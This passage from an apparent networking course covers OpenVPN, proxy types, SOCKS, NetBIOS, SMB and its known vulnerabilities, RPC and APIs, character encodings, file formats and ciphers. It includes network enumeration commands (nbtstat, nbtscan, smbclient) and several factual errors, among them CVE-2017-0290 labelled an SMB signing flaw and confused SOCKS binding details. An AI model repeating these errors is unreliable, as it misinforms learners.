It offers a high degree of customization, making it suitable for a wide range of uses. Because of the customization options, setting up OpenVPN can be more complex for non-technical users compared to some other VPN solutions.

OpenVPN can be configured to use UDP or TCP as it's transport layer protocols:

UDP Protocol (Default):

OpenVPN often uses UDP for communication, providing a lightweight and connectionless transport protocol suitable for VPNs.
The default UDP port number for OpenVPN is 1194.
TCP Protocol:

OpenVPN can also be configured to use TCP for communication, which can be useful in scenarios where UDP traffic is restricted or blocked.
The default TCP port number for OpenVPN is 1194, but it can be configured to use other port numbers such as port 443.


Resources


Instructor Note


3.2.2 Understand Proxies¶
A proxy, or proxy server, functions as a vital intermediary that stands between a user's device, be it a computer or smartphone, and the vast expanse of the internet. Operating as a sophisticated gateway, it expertly facilitates the exchange of requests and responses between the user and the destination server, seamlessly navigating the intricate web of online communication. Proxies, with their multifaceted capabilities, empower users and organizations by delivering anonymity, content filtering, and performance optimization. In this dynamic role, proxies serve as instrumental guardians of privacy, gatekeepers for access control, and enhancers of overall internet efficiency.

This allows for your device's information, such as IP address and possibly your MAC address, to stay hidden. Besides privacy, a proxy can provide additional benefits such as load balancing or security.

When utilizing proxies for secure communications, we must remember that the client only creates a secure connection to the proxy, and the proxy will create the secure connection with the remote server. This means that if the proxy server should be compromised, the data communication can be intercepted.

Typical communication with a proxy server is done over TCP port 1080 but The Onion Router (TOR) browsing uses TCP port 9050 by default.

Here are key aspects of a proxy:

Anonymity: One of the primary functions of a proxy is to provide anonymity for the user. When you connect to a website through a proxy, the website sees the IP address of the proxy server rather than your actual IP address. This can be useful for privacy and security reasons.

Content Filtering: Proxies can be configured to filter and block access to specific content or websites. This is often employed in organizations and institutions to control and monitor internet usage.

Access Control: Proxies can control access to certain resources based on predefined rules. This allows administrators to restrict or grant access to specific websites, services, or content.

Improved Performance: In some cases, proxies can improve network performance by caching frequently requested content. When a user requests a resource that has been cached, the proxy can deliver it directly, reducing the load on the destination server and improving response times.

Security: Proxies can enhance security by acting as a barrier between the user and the internet. They can filter out malicious content, block access to known malicious websites, and provide an additional layer of defense against cyber threats.

Load Balancing: Proxies can distribute incoming network traffic across multiple servers, helping to balance the load and ensure efficient utilization of resources. This is known as load balancing and can improve the overall performance and reliability of a network.

Types of Proxies:

Forward Proxy: Sits between a client and the internet, handling outbound requests on behalf of users.

Client IP Advertised?: 🔁 Configurable
Proxy Use Revealed?: 🔁 Configurable
Used In: Corporate networks, schools, and content-restricted environments for monitoring, access control, and caching.
Reverse Proxy: Sits in front of web servers and handles incoming internet traffic, hiding internal server details.

Client IP Advertised?: ❌ Not to the backend server by default
Proxy Use Revealed?: ❌ Not to users
Used In: Web hosting, content delivery networks (CDNs), load balancing, SSL offloading, and DDoS protection.
Transparent Proxy: Intercepts traffic without client configuration or awareness; does not modify the request.

Client IP Advertised?: ✅ Yes
Proxy Use Revealed?: ✅ Yes
Used In: Public Wi-Fi, libraries, workplaces, or ISPs to cache content or monitor/filter traffic.
Anonymous Proxy: Hides the client’s IP address but tells the destination that a proxy is being used.

Client IP Advertised?: ❌ No
Proxy Use Revealed?: ✅ Yes
Used In: Bypassing IP-based restrictions while maintaining moderate anonymity, such as in casual private browsing.
Elite or High-Anonymous Proxy: Completely conceals both the client’s IP and the fact that a proxy is being used.

Client IP Advertised?: ❌ No
Proxy Use Revealed?: ❌ No
Used In: Privacy-focused tasks, evading censorship, accessing geo-restricted content, or scraping without detection.






Resources


Instructor Note


3.2.2.1 Examine SOCKS protocol¶
SOCKS 4 and SOCKS5 (TCP 1080)



SOCKS (Socket Secure) is a protocol that facilitates communication between clients and servers through a proxy server.
Initiates connections through a proxy
Uses various Client / Server exchange messages
Client can provide authentication to server
Client can request connections from server
Versions:

SOCKS4

Initial version of the SOCKS protocol, originally developed/designed by David Koblas, a system administrator of MIPS Computer Systems in 1992.
Does not support authentication, meaning that anyone who knows the proxy server’s address and port can use it. It offers basic functionality, but it's less secure for environments where controlled access is needed.
Does not support IPv6, only IPv4.
Only supports TCP connections, so it can handle protocols like HTTP, FTP, and others that rely on TCP for data transmission. No UDP support.
Has no built-in security mechanisms. It provides basic forwarding of traffic with no encryption or checks on the data.
Typically has slightly better performance than SOCKS5, since it has fewer features and thus requires less overhead in data processing.
No Proxy binding. Client's IP is not relayed to destination.
Single IP Binding: SOCKS4 is limited to binding a single IP address and port when establishing the connection between the client and the destination server. This means that once a proxy connection is made, it binds the client to that specific IP and port combination.
No Binding Request from the Client: SOCKS4 does not support the ability for a client to specify the destination address dynamically, so the proxy is essentially responsible for routing the client to the specified target server based on predefined settings.
SOCKS5

SOCKS4 modified and extended by Ying-Da Lee from NEC Systems Laboratory and published as RFC 1928 in 1996.
Support for Authentication, allowing clients to authenticate themselves using various methods, such as username/password, GSS-API (Generic Security Services Application Program Interface), or digital certificates.
Fully supports IPv6, which is important as the world transitions from IPv4 to the newer version.
Supports both TCP and UDP connections, making it more versatile. This means it can handle protocols like VoIP (e.g., Skype), video streaming, and online gaming, which may rely on UDP for faster data transfer.
Supports better security features, including data integrity checks and optional encryption (depending on the implementation).
Can be slightly slower than SOCKS4 because of the additional features like authentication, security, and support for more protocols.
Supports Proxy binding. Client's IP is relayed to destination.
Dynamic Binding: SOCKS5 supports dynamic binding. This means that clients can provide the proxy with specific details (such as the destination address and port) at the time of connection. The SOCKS5 server can then establish the connection to the required target dynamically, allowing for more flexible and user-controlled connections.
Binding with Authentication and UDP: SOCKS5 allows clients to request dynamic proxy binding with both TCP and UDP protocols, making it more suitable for applications that require flexibility (e.g., streaming, VoIP, online gaming).


Resources


Instructor Note


3.2.3 Examine Network Basic Input Output System (NetBIOS) protocol¶
NetBIOS, an acronym for Network Basic Input/Output System, emerged as a protocol suite crafted by IBM during the early 1980s. This suite offers a collection of services along with an application programming interface (API), facilitating network communication across local area networks (LANs). Initially conceived for IBM's PC Network, NetBIOS eventually evolved into a de facto standard for LAN communication within the Microsoft Windows ecosystem.

NetBIOS provides services related to the session layer of the OSI model allowing applications on separate computers to communicate over a local area network. The outputs from NetBIOS can provide computer names, group assignments, and MAC addresses of nodes.

NetBIOS vs. DNS: The Domain Name System (DNS) is a directory for communication between devices over the internet. An internet connection is required to use DNS, but NetBIOS is available to all machines on a local area network. If a windows system is unable to resolve a name via DNS, then it will look for a WINS server, then finally uses NetBIOS.

Much of NetBIOS functionality has largly been replaced by DNS however there are still some situations where the use of NetBIOS is still in use today.

Legacy Systems and SMB (Server Message Block): While the NetBIOS protocol itself is not heavily used in modern systems, some NetBIOS-related services are still in use today, particularly as part of the SMB protocol (used for file and printer sharing).
Windows Networking: Windows networks still rely on NetBIOS names for backward compatibility, especially when using legacy applications or systems that haven’t fully transitioned to DNS (Domain Name System).
Local Network Name Resolution: NetBIOS over TCP/IP (NBT) allows Windows-based machines to resolve NetBIOS names to IP addresses within a local network. This is still active in certain configurations, especially in older setups or networks that use LANs without DNS for name resolution.
Home Networks: NetBIOS is often still used in home networks or small business setups where simplicity is preferred, or in legacy systems that require compatibility with older Windows environments.
For more in-depth information: Is is time to get rid of NetBIOS - Sans

Windows:

nbtstat -A <IP Address>
Output will provide the NetBIOS Remote Machine Name Table which has Name, Type(group), and MAC Address.

Linux:

nbtscan -r <IP Address>


Resources


Instructor Note


3.2.3.1 Recognize well-known NetBIOS suffixes (services) and their potential for operational impact¶
NetBIOS names typically consist of two parts: a 15-character computer name and a 16th character, known as the NetBIOS suffix. The NetBIOS suffix helps identify the type or purpose of the resource. While any 16-bit value can be used as a NetBIOS suffix, some suffixes have become well-known and are commonly associated with specific services.

Here are a few well-known NetBIOS suffixes:

00 (Hex): The 00 suffix is often associated with the workstation service. It identifies the primary computer name for a device.
03 (Hex): The 03 suffix is commonly used for the Messenger service. This service enables users to send pop-up messages to each other on a Windows network.
06 (Hex): The 06 suffix is often linked to the Remote Access Service (RAS) server. RAS allows users to connect to a network remotely.
1B (Hex): The 1B suffix is used for the domain master browser. It helps in maintaining a list of available resources in a Windows workgroup or domain.
1C (Hex): The 1C suffix is associated with the domain controller. It indicates the presence of a Windows domain controller on the network.
1D (Hex): The 1D suffix is related to the Master Browser service. It helps in maintaining a list of available resources in a Windows workgroup or domain.
20 (Hex): The 20 suffix is often used for the File Service, indicating that the resource is a file server.
21 (Hex): The 21 suffix is associated with the Remote Access Service (RAS) client. It identifies a RAS client on the network.
2F (Hex): The 2F suffix is commonly linked to the Windows Internet Naming Service (WINS).
NetBIOS provides three distinct services:

Name service (NetBIOS-NS) for name registration and resolution. (UDP/137)
Datagram distribution service (NetBIOS-DGM) for connectionless communication. (UDP/138)
Session service (NetBIOS-SSN) for connection-oriented communication. (TCP/139)


Resources


Instructor Note


3.2.4 Examine Server Message Block (SMB) protocol¶
SMB/CIFS (TCP 139/445 AND UDP 137/138)

The Server Message Block (SMB) protocol serves as a communication protocol predominantly utilized by Microsoft Windows-equipped computers. Its primary function is to facilitate the sharing of files, printers, serial ports, and various communications among network nodes. For user authentication, SMB employs either the NTLM or Kerberos protocols.

Additionally, SMB offers an authenticated inter-process communication (IPC) mechanism. Originally conceived in 1983 by Barry A. Feigenbaum at IBM, SMB aimed to provide shared access to files and printers within a network of systems running IBM's OS/2.

Subsequently, in 1987, Microsoft and 3Com implemented SMB in LAN Manager for OS/2. During this period, SMB utilized the NetBIOS service atop the NetBIOS Frames protocol as its foundational transport. Over time, Microsoft integrated SMB into Windows NT 3.1, continuously updating it to function with newer underlying transports, such as TCP/IP and NetBT. A notable development is the introduction of SMB over QUIC, which made its debut in Windows Server 2022.






smbclient -L <IP Address>
Allowed devices to establish connections to other devices on network to share files, printers and other things.

Several versions since its release in 1984:

SMBv1 was released in 1984 by IBM for file sharing in DOS. Modified by Microsoft in 1990 for integration into Windows GUI.
CIFS was released in 1996. Microsoft launched an initiative to rename SMB to Common Internet File System (CIFS). Included more features and support for symbolic links, hard links, larger file sizes. Rolled out with Windows 95.
SMBv2.0 debuted in 2006 for Windows Vista. It featured a notable boost in performance because of increased efficiency — fewer commands and subcommands meant better speeds.
SMBv2.1 released with Windows 7, bringing improved performance.
SMBv3.0 released with Windows 8 with many updates. Most notable of which is enhanced security — the protocol started supporting end-to-end encryption.
SMBv3.0.2 released with Windows 8.1. It offered the ability to increase security and performance by completely disabling SMBv1.
SMBv3.1.1 was released in 2015 with Windows 10. It added more security elements to the protocol, like AES-128 encryption, protection from man-in-the-middle attacks, and session verification.
SMB Rides over Netbios - allows applications to communicate over a LAN using a NetBIOS name. Deprecated due to DNS.

Netbios Wikipedia

Netbios Dgram Service - UDP 138

Netbios Session Service - TCP 139

Third-Party SMB Implementations:

SAMBA

SAMBA Wiki

Developed to offer file and print services for Windows clients on Unix-based systems, including Linux and other Unix variants.

Facilitates seamless interaction between Unix-based systems and Windows networks, providing features like file sharing, printer services, and authentication.

Enables Unix-based servers to function as file and print servers within a Windows network, ensuring compatibility and interoperability.

Samba is compatible with a wide range of Unix-based operating systems, encompassing Linux, Solaris, AIX, and various BSD variants, including Apple's macOS Server and macOS client (Mac OS X 10.2 and later).

Supports various versions of the SMB protocol, allowing non-Windows systems to actively participate in Windows networking environments.

Netsmb

NSMB, which encompasses Netsmb and SMBFS, constitutes a group of in-kernel SMB client implementations within BSD operating systems.

Originally introduced by Boris Popov in FreeBSD 4.4, this family of implementations has proliferated across various BSD systems, including NetBSD and macOS.

Over time, these implementations have undergone significant divergence.

NQ

NQ stands as a suite of portable SMB client and server implementations crafted by Visuality Systems, an Israel-based company founded in 1998 by Sam Widerman, who previously served as the CEO of Siemens Data Communications.
MoSMB

MoSMB is a proprietary SMB implementation designed for Linux and other Unix-like systems, created by Ryussi Technologies. It exclusively supports SMB versions 2.x and 3.x.


Resources


Instructor Note


3.2.4.1 Examine Server Message Block (SMB) protocol Vulnerabilities¶
Many vulnerabilities to SMB have been discovered since it was developed in 1984. Over the years, several vulnerabilities have been discovered in the SMB protocol that could potentially be exploited by attackers. Here are a few notable SMB protocol vulnerabilities:

EternalBlue (CVE-2017-0144): EternalBlue is a vulnerability in the SMBv1 protocol that gained significant attention following its use in the WannaCry ransomware attack of 2017. It enabled remote code execution on Windows systems vulnerable to the exploit and quickly propagated through networks.

Vulnerabilities in SMBv1: The SMBv1 protocol has been found to have multiple vulnerabilities, including flaws that allow remote code execution. It is recommended to disable SMBv1 due to its inherent security weaknesses.

SMB Signing Downgrade (CVE-2017-0290): This vulnerability enables an attacker to downgrade the SMB signing negotiation process, potentially facilitating the interception and modification of SMB communications.

SMB Relay Attack: SMB relay attacks exploit the authentication mechanism of SMB, allowing an attacker to relay user credentials and gain unauthorized access to network resources. This attack is particularly effective when SMB signing is disabled or weak.

Denial of Service (DoS) Attacks: Various vulnerabilities in the SMB protocol have been discovered that could lead to denial of service attacks. By sending specially crafted requests, an attacker can overwhelm an SMB server, causing it to become unresponsive or crash.

Man-in-the-Middle Attacks: In certain scenarios, attackers can intercept SMB traffic using a man-in-the-middle (MITM) position. This allows them to capture and manipulate sensitive data transmitted over the SMB protocol.

To mitigate these vulnerabilities, it is crucial to maintain up-to-date SMB implementations, disable older versions like SMBv1, enforce secure configurations (such as enabling SMB signing), and regularly apply security patches provided by vendors. Additionally, implementing network segmentation, strong authentication mechanisms, and monitoring systems can aid in detecting and preventing potential attacks targeting the SMB protocol.

Many organizations are moving away from SMB file and printer sharing and moving to cloud or enterprise based solutions.

Some alternatives to file storage:

Enterprise Content Management (ECM) Systems

a. Microsoft Sharepoint

b. OpenText Content Suite

c. IBM FileNet

Cloud Storage Services

a. Onedrive

b. Google Drive

c. Amazon S3

d. Microsoft Azure Blob Storage



Some alternatives to printer sharing are:

Printing directly to the printer

Print Management Software

a. PaperCut

b. Equitrac

c. Pharos

Managed Print Services (MPS)

a. Xerox

b. HP

c. Lexmark

d. Ricoh

Enterprise Output Management (EOM)

a. HP Exstream

b. OpenText Output Management

c. ISIS Papyrus.

Cloud-Based Printing Solutions

a. Google Cloud Print

b. PrinterLogic

Mobile Printing Solutions

a. HP ePrint

b. Apple AirPrint



Resources


Instructor Note


3.2.5 Examine Remote Procedure Call (RPC) Protocol¶
RPC (Any Port)

Remote Procedure Call (RPC) is a protocol that allows a program to request a service from another program located on the same system or on remote computer. It allows these programs to request services without having to understand details of the program. In essence, it standardizes the inter-communication with formalized requests for information. A procedure call is also sometimes known as a function call or a subroutine call.

In essence, Remote Procedure Call (RPC) serves as a method for computer programs to communicate across a network as if they were in close proximity. This enables one program to ask another program on a different computer to perform a service or function. Picture it as requesting a favor from a friend, but in the realm of computers where programs work together to accomplish tasks. RPC simplifies the intricacies of communication, creating the illusion that the distant program is actually a local one. This approach finds extensive use in activities such as distributed computing and networked applications.

RPC is a request/response protocol.

RPC Wikipedia

User application will:

Sends a request for information to an external server

Receives the information from the external server

Display collected data to User

Examples of RPC are:

SOAP

SOAP Example pcap from cloudshark
XML

JSON

NFS



Use the netstat command (Linux/Windows) to show established connections and sockets.



Some examples of RPCs are:

XML-RPC: Uses XML for data encoding, HTTP as the transport protocol.

XML-RPC.NET: An RPC protocol based on XML-RPC but specifically designed for use with the .NET framework.

JSON-RPC: Uses JSON for data encoding, typically over HTTP.

JSON-WSP (JSON Web Service Protocol): Similar to JSON-RPC, JSON-WSP is an RPC protocol that uses JSON for data encoding and typically operates over HTTP.

gRPC: Developed by Google, uses Protocol Buffers, supports HTTP/2.

Thrift: Open-source framework by Facebook, supports multiple languages, uses a binary protocol.

DCOM (Distributed Component Object Model): Developed by Microsoft, supports various transport protocols.

ONC RPC (Open Network Computing RPC): Used in UNIX/Linux environments, based on RPC/XDR standards.

SOAP (Simple Object Access Protocol): A widely used RPC protocol that uses XML for data encoding and typically operates over HTTP or other transport protocols.

REST (Representational State Transfer): Although not a traditional RPC protocol, RESTful APIs can be considered a form of RPC where remote resources are accessed and manipulated using HTTP methods such as GET, POST, PUT, and DELETE. RESTful APIs follow the principles of resource-oriented architecture.

Avro RPC: Developed as part of the Apache Avro project, Avro RPC is a fast and efficient RPC protocol that uses Avro's binary serialization format.

MQTT (Message Queuing Telemetry Transport): Although primarily a messaging protocol, MQTT can also be used for RPC-like communication patterns.



Resources


Instructor Note


3.2.6 Application Programming Interface (API)¶
An Application Programming Interface (API) is a set of rules and tools that allows different software applications to communicate with each other. It defines the methods and data formats that applications can use to request and exchange information. APIs are used to enable the integration of different software systems, making it easier for developers to build on top of existing functionalities without needing to understand the internal workings of the underlying software.

Application Programming Interface, acts as a mediator between different software applications, facilitating their communication and interaction. It consists of a set of regulations, protocols, and tools that govern how software components should interact. By defining methods and data formats, an API enables the exchange of information between applications.

APIs play a crucial role in enabling diverse software systems, services, or platforms to seamlessly interact and share data. They establish a standardized approach for developers to access and leverage the functionality and resources of a specific software system or service, eliminating the need to delve into the intricate details of its internal implementation.



Some examples of APIs are:

Social Media APIs: (Facebook Graph API, Twitter API, Instagram API, LinkedIn API)

Payment Gateway APIs: (PayPal API, Stripe API, Braintree API, Square API)

Maps and Geolocation APIs: (Google Maps API, Mapbox API, OpenStreetMap API, Bing Maps API)

Weather APIs: (OpenWeatherMap API, Weatherbit API, AccuWeather API, Dark Sky API)

Cloud Services APIs: (Amazon Web Services (AWS) API, Microsoft Azure API, Google Cloud Platform (GCP) API, IBM Cloud API)

E-commerce APIs: (Shopify API, WooCommerce API, BigCommerce API, Magento API)

Email and Messaging APIs: (SendGrid API, Twilio API, Mailchimp API, Nexmo API)

Payment Processor APIs: (Visa Developer API, Mastercard Developers API, American Express API, Discover Developer API)

News and Content APIs: (NewsAPI, New York Times API, Guardian API, Giphy API)

Music and Media APIs: (Spotify API, YouTube API, SoundCloud API, Last.fm API)

Travel and Transportation APIs: (Amadeus API, Skyscanner API, Uber API, FlightAware API)

Financial Data APIs: (Alpha Vantage API, Yahoo Finance API, Xignite API, Intrinio API)

Government APIs: (NASA API, OpenFDA API, Census Bureau API, OpenWeatherMap API)

Machine Learning and AI APIs: (TensorFlow API, Microsoft Azure Cognitive Services API, IBM Watson API, Google Cloud Machine Learning API)

Cryptocurrency APIs: (CoinGecko API, CoinMarketCap API, Binance API, Kraken API)



APIs and RPC are mechanisms for communication and interaction between software components.

APIs provide a standardized interface for developers to access and use functionalities of a system or service, often language-agnostic and implemented using various protocols. They focus on exposing functions, operations, or endpoints for clients to interact with the system or service. APIs are versatile and widely used in web development, mobile apps, and third-party service integration.

RPC, on the other hand, is a specific approach for remote procedure calls within a distributed system, treating remote components as local. They are essentially how the communication happens.

Both APIs and RPC involve communication and interaction between software components. API is a set of rules enabling communication between software applications, while RPC is a protocol facilitating the execution of procedures on remote systems.



Resources


Instructor Note


3.2.6.1 RPC vs API¶
While Remote Procedure Call (RPC) and Application Programming Interface (API) are related concepts and are often used together in the context of distributed systems and software development, they are not the same thing.

Remote Procedure Call (RPC):

RPC is a communication protocol that allows a program to execute procedures or functions on a remote server or service as if they were local. It enables distributed applications to communicate and work together seamlessly across network boundaries. RPC abstracts the details of network communication, allowing clients to invoke remote procedures on servers and receive results as if the procedures were executed locally.
Application Programming Interface (API):

API refers to a set of rules and protocols that define how software components or services interact with each other. APIs define the methods, data structures, and protocols that developers can use to interact with a software component, service, or system. APIs can be used to access functionality provided by libraries, frameworks, operating systems, web services, or other software components. APIs can be local (e.g., library APIs) or remote (e.g., web service APIs), and they define the contract between the client and the provider of the service.

While RPC can be used to implement APIs for remote procedure invocation, not all APIs are implemented using RPC. APIs can be implemented using various technologies and communication protocols, including RESTful HTTP, SOAP, GraphQL, messaging protocols (e.g., MQTT, AMQP), and others. RPC is just one of many possible approaches for implementing APIs for remote communication.



Resources


Instructor Note


3.3 Explain OSI Layer 6 functions and responsibilities¶
Layer 6 of the OSI (Open Systems Interconnection) model is the Presentation Layer. The Presentation Layer is responsible for the syntax and semantics of the data exchanged between two systems. It ensures that the data presented to the application layer is in a format that the application layer can understand.



Resources


Instructor Note


3.3.1 Explain the presentation layer functions and responsibilities¶
Presentation Layer - This layer deals with the Translating, Formatting, Encryption, and Compression of data.

Data Translation and Transformation:

The Presentation Layer can translate data between different character encoding schemes, such as ASCII, Unicode, EBCDIC, etc., ensuring compatibility between systems with different encoding requirements.

Common Character Encodings

ASCII Encoding

Description: ASCII (American Standard Code for Information Interchange) represents text characters using 7 or 8 bits. Each character is mapped to a unique numeric value.
Range: 0 to 127 (basic ASCII), 128 to 255 (extended ASCII).
Usage: Used in early computer systems, text files, and programming languages.
Extended ASCII

Description: An extension of ASCII that includes characters beyond the standard ASCII set. It uses the 8th bit, allowing for a total of 256 characters.
Usage: Commonly used for symbols, accented characters, and other special characters in various languages.
Unicode Encoding

Description: Unicode is a character encoding standard that assigns unique numerical values (code points) to most of the world’s writing systems, including symbols, emojis, and special characters.
Range: Over 137,000 characters (supports virtually all modern scripts).
Usage: Used universally in modern software, operating systems, and websites.
UTF-8 Encoding

Description: UTF-8 is a variable-width character encoding that can encode all Unicode characters using one to four bytes.
Usage: Default encoding for modern programming languages and web technologies (e.g., Python 3, JavaScript, HTML).
UTF-16 Encoding

Description: UTF-16 is a character encoding that uses either two bytes or four bytes for each character, depending on the character's Unicode code point.
Usage: Default encoding in Java (for String objects) and JavaScript.
UTF-32 Encoding

Description: UTF-32 is a fixed-width encoding system that uses four bytes for each character.
Usage: Provides a simple, constant-length encoding but uses more storage compared to UTF-8 and UTF-16.
Base64 Encoding

Description: Base64 encoding converts binary data into a text string, encoding it as ASCII characters. It is used to encode binary data (like images or files) for transmission over text-based protocols (e.g., email, HTTP).
Usage: Common for encoding binary data for email attachments and web applications.
URL Encoding (Percent Encoding)

Description: URL encoding replaces special characters in URLs with percent signs (%) followed by two hexadecimal digits that represent the character's byte value in the encoding system (usually UTF-8).
Usage: Ensures that URLs can safely transmit non-ASCII characters or reserved characters (like spaces, commas, and slashes) in web browsers.
Region-Specific Encodings

Windows-1250 (Central and Eastern European)

Description: Used for languages in Central and Eastern Europe, such as Polish, Czech, and Hungarian. It is an 8-bit character encoding.
Usage: Frequently used in Windows-based systems in Europe.
Windows-1252 (Western European)

Description: A superset of ISO-8859-1, this encoding system is used for Western European languages like English, French, German, and Spanish.
Usage: Default encoding for many web pages and documents in Western languages.
ISO-8859-1 (Latin-1)

Description: A character encoding standard that covers most Western European languages, including English, French, Spanish, and German.
Usage: One of the most commonly used encodings in web pages and documents for Western European languages.
Code Page 437 (CP437)

Description: The IBM PC character set, used in early personal computers. It contains a mix of ASCII characters and various symbols, including line-drawing characters.
Usage: Common in DOS-based systems and old IBM PCs.
Shift-JIS (Japanese)

Description: A character encoding for the Japanese language. It is an extension of ISO-2022-JP and includes both ASCII characters and Japanese Kanji, Hiragana, and Katakana characters.
Usage: Common in older Windows systems and some web pages for Japanese content.
KOI8-R (Russian)

Description: KOI8-R is an encoding for the Russian language, used in Cyrillic-based alphabets. It is an 8-bit encoding system that includes both ASCII characters and Cyrillic characters.
Usage: Primarily used in Russian-language systems.
Big5 (Traditional Chinese)

Description: A character encoding for Traditional Chinese characters, mainly used in Taiwan and Hong Kong. It supports both ASCII characters and Chinese characters (in a two-byte encoding scheme).
Usage: Common for Traditional Chinese texts, especially in Taiwan.
GB2312 (Simplified Chinese)

Description: An encoding used for Simplified Chinese characters. It includes over 6,000 characters for Simplified Chinese text.
Usage: Commonly used in mainland China for Simplified Chinese.
GBK (Simplified and Traditional Chinese)

Description: GBK is an extension of GB2312 and can represent both Simplified and Traditional Chinese characters. It supports all characters from GB2312 as well as additional characters from the Big5 encoding.
Usage: Widely used for Chinese language content, especially for text processing in China.
ISO-8859-5 (Cyrillic)

Description: An encoding for Cyrillic alphabets, used in languages like Russian, Bulgarian, and Serbian.
Usage: Common in older systems and documents for Eastern European languages that use the Cyrillic script.
Data Formatting and Syntax Parsing:

The Presentation Layer can format data according to predefined standards or protocols, ensuring that the data conforms to the expected syntax and structure. It parses the incoming data to extract relevant information and present it to the application layer in a meaningful way.

Text-Based Formats:

These are formats that primarily deal with text data, either for storage or transmission, often in a simple or structured manner.

Plain Text (.txt):

Use Case: Simple files that contain unformatted text.
Parsing & Formatting: No parsing is required as it contains raw text. However, it can be used to store configuration information, logs, or basic text content.
Application Layer: Works as raw data passed directly between systems or programs.
Comma-Separated Values (.csv):

Use Case: Storing tabular data, such as spreadsheets or database entries.
Parsing & Formatting: Data is separated by commas or other delimiters (e.g., tabs, semicolons). Libraries in most programming languages (like Python's csv module) can parse and manipulate this data.
Application Layer: Often used for exchanging data between systems or applications like databases and spreadsheets (e.g., Excel).
Extensible Markup Language (.xml):

Use Case: Encodes data in a structured, human-readable format. Widely used in web services, configuration files, and APIs.
Parsing & Formatting: XML has a strict structure defined by tags, making it easy to parse and extract information. Libraries like lxml or xml.etree.ElementTree in Python help in parsing XML data.
Application Layer: Ideal for exchanging structured data across diverse platforms and systems, as it’s both human-readable and machine-readable.
JavaScript Object Notation (.json):

Use Case: Lightweight format for data exchange, commonly used in web applications to communicate between servers and clients (e.g., REST APIs).
Parsing & Formatting: JSON has a strict syntax, with data structured as key-value pairs. Parsing libraries (like json in Python) can easily convert JSON data into usable objects.
Application Layer: Common in web-based systems due to its compact nature and easy compatibility with JavaScript.
Document Formats:

These formats are used for storing, editing, and sharing documents, often containing both text and multimedia.

Portable Document Format (.pdf):

Use Case: Sharing and distributing documents where layout and formatting must remain consistent across different systems.
Parsing & Formatting: PDF is not a text-based format, so extracting data requires specialized libraries (e.g., PyPDF2 or pdfminer for Python). PDFs are more for display and less for manipulation.
Application Layer: Used in applications where consistent document appearance is crucial, like forms, contracts, or eBooks.
Microsoft Word Document (.docx):

Use Case: Word processing format for creating documents with rich formatting, images, tables, etc.
Parsing & Formatting: It’s based on XML, so it can be parsed and manipulated using libraries like python-docx to read or modify document content.
Application Layer: Used for reports, proposals, and other formal documents where both text and multimedia are necessary.
Rich Text Format (.rtf):

Use Case: Cross-platform document format that retains basic text formatting and multimedia, compatible with most word processors.
Parsing & Formatting: RTF uses a special syntax to represent text formatting. Libraries like pyRTF can be used for reading and writing RTF files.
Application Layer: Suitable for documents that need basic styling (like font size, bold, italics) but are meant to be portable across different systems.
Image Formats:

These formats are used for storing and transmitting images, and each has specific use cases depending on the image quality or file size required.

Joint Photographic Experts Group (.jpg/.jpeg):

Use Case: Compressed image format for photographs and complex images.
Parsing & Formatting: JPEG compression reduces file size but can degrade quality. Libraries like Pillow in Python can handle JPGs for image processing.
Application Layer: Used for web images, photography, and anywhere file size is important, with some loss in image quality.
Graphics Interchange Format (.gif):

Use Case: Supports simple animations and is used widely for web animations and memes.
Parsing & Formatting: GIF files can be parsed and manipulated with libraries like Pillow or imageio.
Application Layer: Common on the web for short animations, icons, and memes due to its small file size and animation support.
Portable Network Graphics (.png):

Use Case: Lossless image format that supports transparency.
Parsing & Formatting: PNG retains image quality with no data loss. Libraries like Pillow can handle PNG images for tasks like resizing, cropping, etc.
Application Layer: Ideal for web graphics, logos, or any application requiring transparency and lossless quality.
Audio Formats:

These formats store audio data and vary based on quality and file size.

MP3 (.mp3):

Use Case: Popular audio format for music and podcasts due to compression, which reduces file size without a noticeable loss in quality.
Parsing & Formatting: MP3 files are compressed using lossy algorithms. Libraries like pydub can be used for processing MP3 files.
Application Layer: Widely used in media players, web streaming services, and music storage.
Waveform Audio File Format (.wav):

Use Case: Uncompressed audio format used in professional audio applications.
Parsing & Formatting: WAV files retain original audio quality. They are typically large in size and can be processed using libraries like wave in Python.
Application Layer: Common in professional audio recording, editing, and for high-quality sound storage.
Advanced Audio Coding (.aac):

Use Case: Higher compression efficiency compared to MP3 while maintaining better quality.
Parsing & Formatting: AAC is widely supported and can be processed with libraries like ffmpeg.
Application Layer: Used in streaming platforms (like YouTube and Apple Music) and in broadcasting.
Video Formats:

These formats are used for storing video data and often involve compression techniques to reduce file sizes while maintaining quality.

Moving Picture Experts Group-4 (.mp4):

Use Case: Standard video format, widely supported for video storage and streaming.
Parsing & Formatting: MP4 is a container format that can include video and audio data. It’s supported by many libraries like moviepy and ffmpeg for manipulation.
Application Layer: Common in video playback and streaming applications, such as YouTube, Netflix, and many video players.
Audio Video Interleave (.avi):

Use Case: Container format for video and audio data, typically used for video editing or playback.
Parsing & Formatting: AVI files can be processed using ffmpeg or opencv for video editing and manipulation.
Application Layer: Popular in video editing and storage applications due to its simplicity and support for a variety of codecs.
Flash Video (.flv):

Use Case: Used primarily for streaming video content over the internet.
Parsing & Formatting: Flash video is increasingly less common today, but it was once the standard for web-based video players (like YouTube).
Application Layer: Used for web video players and internet streaming, though it's been largely replaced by newer technologies (e.g., MP4).
Data Encryption and Decryption:

The Presentation Layer can perform encryption and decryption of data to ensure its confidentiality and integrity during transmission. It encrypts data before transmission and decrypts it upon receipt, allowing secure communication between systems.

Symmetric Encryption

Block Ciphers

Block ciphers encrypt data in fixed-size blocks (e.g., 128 bits) at a time. If the data to be encrypted is larger than the block size, it must be broken into multiple blocks, each of which is encrypted separately.
AES (Advanced Encryption Standard): AES operates on 128-bit blocks of data and supports key sizes of 128, 192, or 256 bits.
Blowfish: Blowfish is a block cipher that operates on 64-bit blocks of data.
Twofish: Twofish is an improved version of Blowfish, using 128-bit blocks and key sizes up to 256 bits.
DES (Data Encryption Standard): DES is an older block cipher that encrypts 64-bit blocks with a 56-bit key.
Stream Ciphers

Stream ciphers encrypt data one bit or byte at a time, typically generating a key stream that is combined with the plaintext using an XOR operation.
RC4 (Rivest Cipher 4): RC4 is one of the most well-known stream ciphers but has been found vulnerable to several attacks, making it unsuitable for most modern applications.
ChaCha20: ChaCha20 is a stream cipher considered more secure than RC4. It is used in modern applications like TLS and VPNs due to its speed and robust security features.
Salsa20: Salsa20 is a predecessor to ChaCha20 and is designed for high speed and security in software implementations.
A5/1: A5/1 is a stream cipher used in GSM mobile phone communications. It’s considered weak and has been cracked, making it unsuitable for modern applications.
Asymmetric Encryption

